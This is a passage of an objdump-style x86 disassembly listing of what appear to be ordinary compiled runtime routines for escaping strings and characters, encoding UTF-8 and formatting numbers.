  4030d0:	55                   	push   %ebp
  4030d1:	83 ec 0c             	sub    $0xc,%esp
  4030d4:	83 c5 0c             	add    $0xc,%ebp
  4030d7:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  4030db:	74 13                	je     0x4030f0
  4030dd:	8b 75 dc             	mov    -0x24(%ebp),%esi
  4030e0:	ff 15 08 30 43 00    	call   *0x433008
  4030e6:	56                   	push   %esi
  4030e7:	6a 00                	push   $0x0
  4030e9:	50                   	push   %eax
  4030ea:	ff 15 0c 30 43 00    	call   *0x43300c
  4030f0:	83 c4 0c             	add    $0xc,%esp
  4030f3:	5d                   	pop    %ebp
  4030f4:	c3                   	ret
  4030f5:	cc                   	int3
  4030f6:	cc                   	int3
  4030f7:	cc                   	int3
  4030f8:	cc                   	int3
  4030f9:	cc                   	int3
  4030fa:	cc                   	int3
  4030fb:	cc                   	int3
  4030fc:	cc                   	int3
  4030fd:	cc                   	int3
  4030fe:	cc                   	int3
  4030ff:	cc                   	int3
  403100:	b8 88 00 98 00       	mov    $0x980088,%eax
  403105:	e9 08 0b 02 00       	jmp    0x423c12
  40310a:	cc                   	int3
  40310b:	cc                   	int3
  40310c:	cc                   	int3
  40310d:	cc                   	int3
  40310e:	cc                   	int3
  40310f:	cc                   	int3
  403110:	b8 bc 00 98 00       	mov    $0x9800bc,%eax
  403115:	e9 f8 0a 02 00       	jmp    0x423c12
  40311a:	cc                   	int3
  40311b:	cc                   	int3
  40311c:	cc                   	int3
  40311d:	cc                   	int3
  40311e:	cc                   	int3
  40311f:	cc                   	int3
  403120:	b8 e8 00 98 00       	mov    $0x9800e8,%eax
  403125:	e9 e8 0a 02 00       	jmp    0x423c12
  40312a:	cc                   	int3
  40312b:	cc                   	int3
  40312c:	cc                   	int3
  40312d:	cc                   	int3
  40312e:	cc                   	int3
  40312f:	cc                   	int3
  403130:	b8 14 01 98 00       	mov    $0x980114,%eax
  403135:	e9 d8 0a 02 00       	jmp    0x423c12
  40313a:	cc                   	int3
  40313b:	cc                   	int3
  40313c:	cc                   	int3
  40313d:	cc                   	int3
  40313e:	cc                   	int3
  40313f:	cc                   	int3
  403140:	b8 40 01 98 00       	mov    $0x980140,%eax
  403145:	e9 c8 0a 02 00       	jmp    0x423c12
  40314a:	cc                   	int3
  40314b:	cc                   	int3
  40314c:	cc                   	int3
  40314d:	cc                   	int3
  40314e:	cc                   	int3
  40314f:	cc                   	int3
  403150:	b8 6c 01 98 00       	mov    $0x98016c,%eax
  403155:	e9 b8 0a 02 00       	jmp    0x423c12
  40315a:	cc                   	int3
  40315b:	cc                   	int3
  40315c:	cc                   	int3
  40315d:	cc                   	int3
  40315e:	cc                   	int3
  40315f:	cc                   	int3
  403160:	b8 98 01 98 00       	mov    $0x980198,%eax
  403165:	e9 a8 0a 02 00       	jmp    0x423c12
  40316a:	cc                   	int3
  40316b:	cc                   	int3
  40316c:	cc                   	int3
  40316d:	cc                   	int3
  40316e:	cc                   	int3
  40316f:	cc                   	int3
  403170:	55                   	push   %ebp
  403171:	89 e5                	mov    %esp,%ebp
  403173:	53                   	push   %ebx
  403174:	57                   	push   %edi
  403175:	56                   	push   %esi
  403176:	83 ec 3c             	sub    $0x3c,%esp
  403179:	8b 45 10             	mov    0x10(%ebp),%eax
  40317c:	8b 30                	mov    (%eax),%esi
  40317e:	8b 40 04             	mov    0x4(%eax),%eax
  403181:	8b 78 10             	mov    0x10(%eax),%edi
  403184:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403187:	6a 22                	push   $0x22
  403189:	56                   	push   %esi
  40318a:	ff d7                	call   *%edi
  40318c:	83 c4 08             	add    $0x8,%esp
  40318f:	b1 01                	mov    $0x1,%cl
  403191:	84 c0                	test   %al,%al
  403193:	0f 85 e1 02 00 00    	jne    0x40347a
  403199:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40319c:	8b 45 08             	mov    0x8(%ebp),%eax
  40319f:	85 c9                	test   %ecx,%ecx
  4031a1:	0f 84 8f 02 00 00    	je     0x403436
  4031a7:	89 ca                	mov    %ecx,%edx
  4031a9:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4031ac:	89 cf                	mov    %ecx,%edi
  4031ae:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4031b1:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4031b8:	f7 da                	neg    %edx
  4031ba:	89 55 cc             	mov    %edx,-0x34(%ebp)
  4031bd:	31 d2                	xor    %edx,%edx
  4031bf:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4031c2:	89 fa                	mov    %edi,%edx
  4031c4:	8d 0c 38             	lea    (%eax,%edi,1),%ecx
  4031c7:	31 f6                	xor    %esi,%esi
  4031c9:	f7 da                	neg    %edx
  4031cb:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4031ce:	66 90                	xchg   %ax,%ax
  4031d0:	0f b6 1c 30          	movzbl (%eax,%esi,1),%ebx
  4031d4:	89 d9                	mov    %ebx,%ecx
  4031d6:	80 c1 81             	add    $0x81,%cl
  4031d9:	80 f9 a1             	cmp    $0xa1,%cl
  4031dc:	72 22                	jb     0x403200
  4031de:	83 fb 22             	cmp    $0x22,%ebx
  4031e1:	74 1d                	je     0x403200
  4031e3:	83 fb 5c             	cmp    $0x5c,%ebx
  4031e6:	74 18                	je     0x403200
  4031e8:	46                   	inc    %esi
  4031e9:	89 d1                	mov    %edx,%ecx
  4031eb:	01 f1                	add    %esi,%ecx
  4031ed:	75 e1                	jne    0x4031d0
  4031ef:	e9 18 02 00 00       	jmp    0x40340c
  4031f4:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4031fb:	00 00 00 
  4031fe:	66 90                	xchg   %ax,%ax
  403200:	8b 7d ec             	mov    -0x14(%ebp),%edi
  403203:	0f b6 1c 30          	movzbl (%eax,%esi,1),%ebx
  403207:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  40320a:	84 db                	test   %bl,%bl
  40320c:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40320f:	0f b6 cb             	movzbl %bl,%ecx
  403212:	78 1c                	js     0x403230
  403214:	8d 44 30 01          	lea    0x1(%eax,%esi,1),%eax
  403218:	89 ca                	mov    %ecx,%edx
  40321a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40321d:	e9 9e 00 00 00       	jmp    0x4032c0
  403222:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403229:	00 00 00 
  40322c:	0f 1f 40 00          	nopl   0x0(%eax)
  403230:	0f b6 7c 30 01       	movzbl 0x1(%eax,%esi,1),%edi
  403235:	83 e1 1f             	and    $0x1f,%ecx
  403238:	83 e7 3f             	and    $0x3f,%edi
  40323b:	80 fb df             	cmp    $0xdf,%bl
  40323e:	76 4f                	jbe    0x40328f
  403240:	0f b6 54 30 02       	movzbl 0x2(%eax,%esi,1),%edx
  403245:	c1 e7 06             	shl    $0x6,%edi
  403248:	83 e2 3f             	and    $0x3f,%edx
  40324b:	09 fa                	or     %edi,%edx
  40324d:	80 fb f0             	cmp    $0xf0,%bl
  403250:	72 50                	jb     0x4032a2
  403252:	8d 7c 30 04          	lea    0x4(%eax,%esi,1),%edi
  403256:	83 e1 07             	and    $0x7,%ecx
  403259:	89 7d e0             	mov    %edi,-0x20(%ebp)
  40325c:	89 d7                	mov    %edx,%edi
  40325e:	0f b6 54 30 03       	movzbl 0x3(%eax,%esi,1),%edx
  403263:	c1 e1 12             	shl    $0x12,%ecx
  403266:	c1 e7 06             	shl    $0x6,%edi
  403269:	83 e2 3f             	and    $0x3f,%edx
  40326c:	09 fa                	or     %edi,%edx
  40326e:	8b 7d ec             	mov    -0x14(%ebp),%edi
  403271:	09 ca                	or     %ecx,%edx
  403273:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
  403279:	75 45                	jne    0x4032c0
  40327b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40327e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403281:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403284:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  403287:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40328a:	e9 6e 01 00 00       	jmp    0x4033fd
  40328f:	c1 e1 06             	shl    $0x6,%ecx
  403292:	8d 44 30 02          	lea    0x2(%eax,%esi,1),%eax
  403296:	09 f9                	or     %edi,%ecx
  403298:	8b 7d ec             	mov    -0x14(%ebp),%edi
  40329b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40329e:	89 ca                	mov    %ecx,%edx
  4032a0:	eb 1e                	jmp    0x4032c0
  4032a2:	8b 7d ec             	mov    -0x14(%ebp),%edi
  4032a5:	8d 44 30 03          	lea    0x3(%eax,%esi,1),%eax
  4032a9:	c1 e1 0c             	shl    $0xc,%ecx
  4032ac:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4032af:	09 ca                	or     %ecx,%edx
  4032b1:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4032b8:	00 00 00 
  4032bb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  4032c0:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4032c3:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4032c6:	68 01 00 01 00       	push   $0x10001
  4032cb:	e8 10 25 00 00       	call   0x4057e0
  4032d0:	83 c4 04             	add    $0x4,%esp
  4032d3:	0f b6 5d c5          	movzbl -0x3b(%ebp),%ebx
  4032d7:	0f b6 4d c4          	movzbl -0x3c(%ebp),%ecx
  4032db:	89 d8                	mov    %ebx,%eax
  4032dd:	28 c8                	sub    %cl,%al
  4032df:	3c 01                	cmp    $0x1,%al
  4032e1:	0f 84 d8 00 00 00    	je     0x4033bf
  4032e7:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4032ea:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4032ed:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  4032f0:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4032f3:	39 c2                	cmp    %eax,%edx
  4032f5:	0f 87 8d 01 00 00    	ja     0x403488
  4032fb:	85 d2                	test   %edx,%edx
  4032fd:	74 1b                	je     0x40331a
  4032ff:	39 ca                	cmp    %ecx,%edx
  403301:	73 11                	jae    0x403314
  403303:	8b 45 08             	mov    0x8(%ebp),%eax
  403306:	80 3c 10 bf          	cmpb   $0xbf,(%eax,%edx,1)
  40330a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40330d:	7f 0b                	jg     0x40331a
  40330f:	e9 74 01 00 00       	jmp    0x403488
  403314:	0f 85 6e 01 00 00    	jne    0x403488
  40331a:	85 c0                	test   %eax,%eax
  40331c:	74 1d                	je     0x40333b
  40331e:	39 c8                	cmp    %ecx,%eax
  403320:	73 10                	jae    0x403332
  403322:	8b 45 08             	mov    0x8(%ebp),%eax
  403325:	01 f8                	add    %edi,%eax
  403327:	80 3c 06 bf          	cmpb   $0xbf,(%esi,%eax,1)
  40332b:	7f 0e                	jg     0x40333b
  40332d:	e9 56 01 00 00       	jmp    0x403488
  403332:	03 45 cc             	add    -0x34(%ebp),%eax
  403335:	0f 85 4d 01 00 00    	jne    0x403488
  40333b:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40333e:	89 f8                	mov    %edi,%eax
  403340:	29 d0                	sub    %edx,%eax
  403342:	03 55 08             	add    0x8(%ebp),%edx
  403345:	01 f0                	add    %esi,%eax
  403347:	8b 79 0c             	mov    0xc(%ecx),%edi
  40334a:	50                   	push   %eax
  40334b:	52                   	push   %edx
  40334c:	ff 75 e4             	push   -0x1c(%ebp)
  40334f:	ff d7                	call   *%edi
  403351:	83 c4 0c             	add    $0xc,%esp
  403354:	84 c0                	test   %al,%al
  403356:	0f 85 28 01 00 00    	jne    0x403484
  40335c:	80 fb 81             	cmp    $0x81,%bl
  40335f:	72 0e                	jb     0x40336f
  403361:	ff 75 b8             	push   -0x48(%ebp)
  403364:	ff 75 e4             	push   -0x1c(%ebp)
  403367:	ff 55 d8             	call   *-0x28(%ebp)
  40336a:	83 c4 08             	add    $0x8,%esp
  40336d:	eb 16                	jmp    0x403385
  40336f:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  403372:	0f b6 c3             	movzbl %bl,%eax
  403375:	29 c8                	sub    %ecx,%eax
  403377:	8d 4c 0d b8          	lea    -0x48(%ebp,%ecx,1),%ecx
  40337b:	50                   	push   %eax
  40337c:	51                   	push   %ecx
  40337d:	ff 75 e4             	push   -0x1c(%ebp)
  403380:	ff d7                	call   *%edi
  403382:	83 c4 0c             	add    $0xc,%esp
  403385:	84 c0                	test   %al,%al
  403387:	0f 85 f7 00 00 00    	jne    0x403484
  40338d:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403390:	b9 01 00 00 00       	mov    $0x1,%ecx
  403395:	3d 80 00 00 00       	cmp    $0x80,%eax
  40339a:	72 19                	jb     0x4033b5
  40339c:	b9 02 00 00 00       	mov    $0x2,%ecx
  4033a1:	3d 00 08 00 00       	cmp    $0x800,%eax
  4033a6:	72 0d                	jb     0x4033b5
  4033a8:	3d 00 00 01 00       	cmp    $0x10000,%eax
  4033ad:	b9 04 00 00 00       	mov    $0x4,%ecx
  4033b2:	83 d9 00             	sbb    $0x0,%ecx
  4033b5:	8b 7d ec             	mov    -0x14(%ebp),%edi
  4033b8:	01 f9                	add    %edi,%ecx
  4033ba:	01 f1                	add    %esi,%ecx
  4033bc:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4033bf:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4033c2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4033c5:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  4033c8:	b8 01 00 00 00       	mov    $0x1,%eax
  4033cd:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  4033d3:	72 1b                	jb     0x4033f0
  4033d5:	b8 02 00 00 00       	mov    $0x2,%eax
  4033da:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  4033e0:	72 0e                	jb     0x4033f0
  4033e2:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  4033e8:	b8 04 00 00 00       	mov    $0x4,%eax
  4033ed:	83 d8 00             	sbb    $0x0,%eax
  4033f0:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4033f3:	01 f7                	add    %esi,%edi
  4033f5:	01 c7                	add    %eax,%edi
  4033f7:	89 7d ec             	mov    %edi,-0x14(%ebp)
  4033fa:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4033fd:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403400:	29 c3                	sub    %eax,%ebx
  403402:	89 df                	mov    %ebx,%edi
  403404:	0f 85 b5 fd ff ff    	jne    0x4031bf
  40340a:	eb 0c                	jmp    0x403418
  40340c:	03 7d ec             	add    -0x14(%ebp),%edi
  40340f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403412:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403415:	89 7d f0             	mov    %edi,-0x10(%ebp)
  403418:	3b 55 f0             	cmp    -0x10(%ebp),%edx
  40341b:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40341e:	8b 7d d8             	mov    -0x28(%ebp),%edi
  403421:	8b 45 08             	mov    0x8(%ebp),%eax
  403424:	77 74                	ja     0x40349a
  403426:	85 d2                	test   %edx,%edx
  403428:	74 14                	je     0x40343e
  40342a:	39 ca                	cmp    %ecx,%edx
  40342c:	73 0e                	jae    0x40343c
  40342e:	80 3c 10 bf          	cmpb   $0xbf,(%eax,%edx,1)
  403432:	7f 0a                	jg     0x40343e
  403434:	eb 64                	jmp    0x40349a
  403436:	31 c9                	xor    %ecx,%ecx
  403438:	31 d2                	xor    %edx,%edx
  40343a:	eb 1e                	jmp    0x40345a
  40343c:	75 5c                	jne    0x40349a
  40343e:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  403441:	85 db                	test   %ebx,%ebx
  403443:	74 0f                	je     0x403454
  403445:	39 cb                	cmp    %ecx,%ebx
  403447:	73 0f                	jae    0x403458
  403449:	80 3c 18 bf          	cmpb   $0xbf,(%eax,%ebx,1)
  40344d:	7e 4b                	jle    0x40349a
  40344f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403452:	eb 06                	jmp    0x40345a
  403454:	31 c9                	xor    %ecx,%ecx
  403456:	eb 02                	jmp    0x40345a
  403458:	75 40                	jne    0x40349a
  40345a:	29 d1                	sub    %edx,%ecx
  40345c:	01 d0                	add    %edx,%eax
  40345e:	51                   	push   %ecx
  40345f:	50                   	push   %eax
  403460:	56                   	push   %esi
  403461:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403464:	ff 50 0c             	call   *0xc(%eax)
  403467:	83 c4 0c             	add    $0xc,%esp
  40346a:	84 c0                	test   %al,%al
  40346c:	b1 01                	mov    $0x1,%cl
  40346e:	75 0a                	jne    0x40347a
  403470:	6a 22                	push   $0x22
  403472:	56                   	push   %esi
  403473:	ff d7                	call   *%edi
  403475:	83 c4 08             	add    $0x8,%esp
  403478:	89 c1                	mov    %eax,%ecx
  40347a:	89 c8                	mov    %ecx,%eax
  40347c:	83 c4 3c             	add    $0x3c,%esp
  40347f:	5e                   	pop    %esi
  403480:	5f                   	pop    %edi
  403481:	5b                   	pop    %ebx
  403482:	5d                   	pop    %ebp
  403483:	c3                   	ret
  403484:	b1 01                	mov    $0x1,%cl
  403486:	eb f2                	jmp    0x40347a
  403488:	01 f7                	add    %esi,%edi
  40348a:	68 58 3c 43 00       	push   $0x433c58
  40348f:	57                   	push   %edi
  403490:	52                   	push   %edx
  403491:	51                   	push   %ecx
  403492:	ff 75 08             	push   0x8(%ebp)
  403495:	e8 76 e1 02 00       	call   0x431610
  40349a:	68 68 3c 43 00       	push   $0x433c68
  40349f:	ff 75 f0             	push   -0x10(%ebp)
  4034a2:	52                   	push   %edx
  4034a3:	51                   	push   %ecx
  4034a4:	50                   	push   %eax
  4034a5:	e8 66 e1 02 00       	call   0x431610
  4034aa:	cc                   	int3
  4034ab:	cc                   	int3
  4034ac:	cc                   	int3
  4034ad:	cc                   	int3
  4034ae:	cc                   	int3
  4034af:	cc                   	int3
  4034b0:	55                   	push   %ebp
  4034b1:	89 e5                	mov    %esp,%ebp
  4034b3:	53                   	push   %ebx
  4034b4:	57                   	push   %edi
  4034b5:	56                   	push   %esi
  4034b6:	83 ec 10             	sub    $0x10,%esp
  4034b9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4034bc:	8b 58 04             	mov    0x4(%eax),%ebx
  4034bf:	8b 30                	mov    (%eax),%esi
  4034c1:	8b 7b 10             	mov    0x10(%ebx),%edi
  4034c4:	6a 27                	push   $0x27
  4034c6:	56                   	push   %esi
  4034c7:	ff d7                	call   *%edi
  4034c9:	83 c4 08             	add    $0x8,%esp
  4034cc:	89 c1                	mov    %eax,%ecx
  4034ce:	b0 01                	mov    $0x1,%al
  4034d0:	84 c9                	test   %cl,%cl
  4034d2:	75 4e                	jne    0x403522
  4034d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4034d7:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4034da:	8b 10                	mov    (%eax),%edx
  4034dc:	68 01 01 00 00       	push   $0x101
  4034e1:	e8 fa 22 00 00       	call   0x4057e0
  4034e6:	83 c4 04             	add    $0x4,%esp
  4034e9:	0f b6 45 f1          	movzbl -0xf(%ebp),%eax
  4034ed:	3d 81 00 00 00       	cmp    $0x81,%eax
  4034f2:	72 0b                	jb     0x4034ff
  4034f4:	ff 75 e4             	push   -0x1c(%ebp)
  4034f7:	56                   	push   %esi
  4034f8:	ff d7                	call   *%edi
  4034fa:	83 c4 08             	add    $0x8,%esp
  4034fd:	eb 13                	jmp    0x403512
  4034ff:	0f b6 4d f0          	movzbl -0x10(%ebp),%ecx
  403503:	29 c8                	sub    %ecx,%eax
  403505:	8d 4c 0d e4          	lea    -0x1c(%ebp,%ecx,1),%ecx
  403509:	50                   	push   %eax
  40350a:	51                   	push   %ecx
  40350b:	56                   	push   %esi
  40350c:	ff 53 0c             	call   *0xc(%ebx)
  40350f:	83 c4 0c             	add    $0xc,%esp
  403512:	89 c1                	mov    %eax,%ecx
  403514:	b0 01                	mov    $0x1,%al
  403516:	84 c9                	test   %cl,%cl
  403518:	75 08                	jne    0x403522
  40351a:	6a 27                	push   $0x27
  40351c:	56                   	push   %esi
  40351d:	ff d7                	call   *%edi
  40351f:	83 c4 08             	add    $0x8,%esp
  403522:	83 c4 10             	add    $0x10,%esp
  403525:	5e                   	pop    %esi
  403526:	5f                   	pop    %edi
  403527:	5b                   	pop    %ebx
  403528:	5d                   	pop    %ebp
  403529:	c3                   	ret
  40352a:	cc                   	int3
  40352b:	cc                   	int3
  40352c:	cc                   	int3
  40352d:	cc                   	int3
  40352e:	cc                   	int3
  40352f:	cc                   	int3
  403530:	55                   	push   %ebp
  403531:	89 e5                	mov    %esp,%ebp
  403533:	8b 45 08             	mov    0x8(%ebp),%eax
  403536:	8b 55 0c             	mov    0xc(%ebp),%edx
  403539:	8b 08                	mov    (%eax),%ecx
  40353b:	e8 c0 04 00 00       	call   0x403a00
  403540:	5d                   	pop    %ebp
  403541:	c3                   	ret
  403542:	cc                   	int3
  403543:	cc                   	int3
  403544:	cc                   	int3
  403545:	cc                   	int3
  403546:	cc                   	int3
  403547:	cc                   	int3
  403548:	cc                   	int3
  403549:	cc                   	int3
  40354a:	cc                   	int3
  40354b:	cc                   	int3
  40354c:	cc                   	int3
  40354d:	cc                   	int3
  40354e:	cc                   	int3
  40354f:	cc                   	int3
  403550:	55                   	push   %ebp
  403551:	89 e5                	mov    %esp,%ebp
  403553:	8b 45 08             	mov    0x8(%ebp),%eax
  403556:	8b 48 04             	mov    0x4(%eax),%ecx
  403559:	ff 75 0c             	push   0xc(%ebp)
  40355c:	ff 30                	push   (%eax)
  40355e:	ff 51 0c             	call   *0xc(%ecx)
  403561:	83 c4 08             	add    $0x8,%esp
  403564:	5d                   	pop    %ebp
  403565:	c3                   	ret
  403566:	cc                   	int3
  403567:	cc                   	int3
  403568:	cc                   	int3
  403569:	cc                   	int3
  40356a:	cc                   	int3
  40356b:	cc                   	int3
  40356c:	cc                   	int3
  40356d:	cc                   	int3
  40356e:	cc                   	int3
  40356f:	cc                   	int3
  403570:	55                   	push   %ebp
  403571:	89 e5                	mov    %esp,%ebp
  403573:	53                   	push   %ebx
  403574:	56                   	push   %esi
  403575:	50                   	push   %eax
  403576:	8b 75 0c             	mov    0xc(%ebp),%esi
  403579:	8b 45 08             	mov    0x8(%ebp),%eax
  40357c:	f6 46 0b 18          	testb  $0x18,0xb(%esi)
  403580:	8b 08                	mov    (%eax),%ecx
  403582:	74 19                	je     0x40359d
  403584:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40358a:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  403591:	73 18                	jae    0x4035ab
  403593:	88 4d f4             	mov    %cl,-0xc(%ebp)
  403596:	b8 01 00 00 00       	mov    $0x1,%eax
  40359b:	eb 73                	jmp    0x403610
  40359d:	8b 46 04             	mov    0x4(%esi),%eax
  4035a0:	51                   	push   %ecx
  4035a1:	ff 36                	push   (%esi)
  4035a3:	ff 50 10             	call   *0x10(%eax)
  4035a6:	83 c4 0c             	add    $0xc,%esp
  4035a9:	eb 73                	jmp    0x40361e
  4035ab:	89 ca                	mov    %ecx,%edx
  4035ad:	89 cb                	mov    %ecx,%ebx
  4035af:	80 e2 3f             	and    $0x3f,%dl
  4035b2:	c1 eb 06             	shr    $0x6,%ebx
  4035b5:	80 ca 80             	or     $0x80,%dl
  4035b8:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4035be:	73 10                	jae    0x4035d0
  4035c0:	80 cb c0             	or     $0xc0,%bl
  4035c3:	b8 02 00 00 00       	mov    $0x2,%eax
  4035c8:	88 5d f4             	mov    %bl,-0xc(%ebp)
  4035cb:	88 55 f5             	mov    %dl,-0xb(%ebp)
  4035ce:	eb 40                	jmp    0x403610
  4035d0:	80 e3 3f             	and    $0x3f,%bl
  4035d3:	89 c8                	mov    %ecx,%eax
  4035d5:	80 cb 80             	or     $0x80,%bl
  4035d8:	c1 e8 0c             	shr    $0xc,%eax
  4035db:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  4035e1:	77 12                	ja     0x4035f5
  4035e3:	0c e0                	or     $0xe0,%al
  4035e5:	88 45 f4             	mov    %al,-0xc(%ebp)
  4035e8:	88 5d f5             	mov    %bl,-0xb(%ebp)
  4035eb:	88 55 f6             	mov    %dl,-0xa(%ebp)
  4035ee:	b8 03 00 00 00       	mov    $0x3,%eax
  4035f3:	eb 1b                	jmp    0x403610
  4035f5:	24 3f                	and    $0x3f,%al
  4035f7:	c1 e9 12             	shr    $0x12,%ecx
  4035fa:	80 c9 f0             	or     $0xf0,%cl
  4035fd:	0c 80                	or     $0x80,%al
  4035ff:	88 4d f4             	mov    %cl,-0xc(%ebp)
  403602:	88 45 f5             	mov    %al,-0xb(%ebp)
  403605:	b8 04 00 00 00       	mov    $0x4,%eax
  40360a:	88 5d f6             	mov    %bl,-0xa(%ebp)
  40360d:	88 55 f7             	mov    %dl,-0x9(%ebp)
  403610:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  403613:	50                   	push   %eax
  403614:	51                   	push   %ecx
  403615:	56                   	push   %esi
  403616:	e8 f5 10 00 00       	call   0x404710
  40361b:	83 c4 10             	add    $0x10,%esp
  40361e:	5e                   	pop    %esi
  40361f:	5b                   	pop    %ebx
  403620:	5d                   	pop    %ebp
  403621:	c3                   	ret
  403622:	cc                   	int3
  403623:	cc                   	int3
  403624:	cc                   	int3
  403625:	cc                   	int3
  403626:	cc                   	int3
  403627:	cc                   	int3
  403628:	cc                   	int3
  403629:	cc                   	int3
  40362a:	cc                   	int3
  40362b:	cc                   	int3
  40362c:	cc                   	int3
  40362d:	cc                   	int3
  40362e:	cc                   	int3
  40362f:	cc                   	int3
  403630:	55                   	push   %ebp
  403631:	89 e5                	mov    %esp,%ebp
  403633:	8b 45 08             	mov    0x8(%ebp),%eax
  403636:	ff 70 04             	push   0x4(%eax)
  403639:	ff 30                	push   (%eax)
  40363b:	ff 75 0c             	push   0xc(%ebp)
  40363e:	e8 cd 10 00 00       	call   0x404710
  403643:	83 c4 0c             	add    $0xc,%esp
  403646:	5d                   	pop    %ebp
  403647:	c3                   	ret
  403648:	cc                   	int3
  403649:	cc                   	int3
  40364a:	cc                   	int3
  40364b:	cc                   	int3
  40364c:	cc                   	int3
  40364d:	cc                   	int3
  40364e:	cc                   	int3
  40364f:	cc                   	int3
  403650:	55                   	push   %ebp
  403651:	89 e5                	mov    %esp,%ebp
  403653:	56                   	push   %esi
  403654:	50                   	push   %eax
  403655:	8b 45 08             	mov    0x8(%ebp),%eax
  403658:	0f b6 08             	movzbl (%eax),%ecx
  40365b:	b8 03 00 00 00       	mov    $0x3,%eax
  403660:	80 f9 0a             	cmp    $0xa,%cl
  403663:	89 ca                	mov    %ecx,%edx
  403665:	72 27                	jb     0x40368e
  403667:	0f b6 c1             	movzbl %cl,%eax
  40366a:	88 cd                	mov    %cl,%ch
  40366c:	8d 14 80             	lea    (%eax,%eax,4),%edx
  40366f:	8d 14 d0             	lea    (%eax,%edx,8),%edx
  403672:	c1 ea 0c             	shr    $0xc,%edx
  403675:	6b c2 64             	imul   $0x64,%edx,%eax
  403678:	28 c5                	sub    %al,%ch
  40367a:	0f b6 c5             	movzbl %ch,%eax
  40367d:	0f b7 84 00 78 3c 43 	movzwl 0x433c78(%eax,%eax,1),%eax
  403684:	00 
  403685:	66 89 45 fa          	mov    %ax,-0x6(%ebp)
  403689:	b8 01 00 00 00       	mov    $0x1,%eax
  40368e:	84 d2                	test   %dl,%dl
  403690:	8b 75 0c             	mov    0xc(%ebp),%esi
  403693:	0f 94 c5             	sete   %ch
  403696:	84 c9                	test   %cl,%cl
  403698:	0f 95 c1             	setne  %cl
  40369b:	84 e9                	test   %ch,%cl
  40369d:	75 10                	jne    0x4036af
  40369f:	0f b6 ca             	movzbl %dl,%ecx
  4036a2:	0f b6 8c 09 79 3c 43 	movzbl 0x433c79(%ecx,%ecx,1),%ecx
  4036a9:	00 
  4036aa:	88 4c 05 f8          	mov    %cl,-0x8(%ebp,%eax,1)
  4036ae:	48                   	dec    %eax
  4036af:	b9 03 00 00 00       	mov    $0x3,%ecx
  4036b4:	29 c1                	sub    %eax,%ecx
  4036b6:	8d 44 05 f9          	lea    -0x7(%ebp,%eax,1),%eax
  4036ba:	51                   	push   %ecx
  4036bb:	50                   	push   %eax
  4036bc:	6a 00                	push   $0x0
  4036be:	6a 01                	push   $0x1
  4036c0:	6a 01                	push   $0x1
  4036c2:	56                   	push   %esi
  4036c3:	e8 b8 0a 00 00       	call   0x404180
  4036c8:	83 c4 1c             	add    $0x1c,%esp
  4036cb:	5e                   	pop    %esi
  4036cc:	5d                   	pop    %ebp
  4036cd:	c3                   	ret
  4036ce:	cc                   	int3
  4036cf:	cc                   	int3
  4036d0:	55                   	push   %ebp
  4036d1:	89 e5                	mov    %esp,%ebp
  4036d3:	53                   	push   %ebx
  4036d4:	57                   	push   %edi
  4036d5:	56                   	push   %esi
  4036d6:	83 ec 10             	sub    $0x10,%esp
  4036d9:	8b 45 08             	mov    0x8(%ebp),%eax
  4036dc:	8b 00                	mov    (%eax),%eax
  4036de:	89 c6                	mov    %eax,%esi
  4036e0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4036e3:	f7 de                	neg    %esi
  4036e5:	0f 48 f0             	cmovs  %eax,%esi
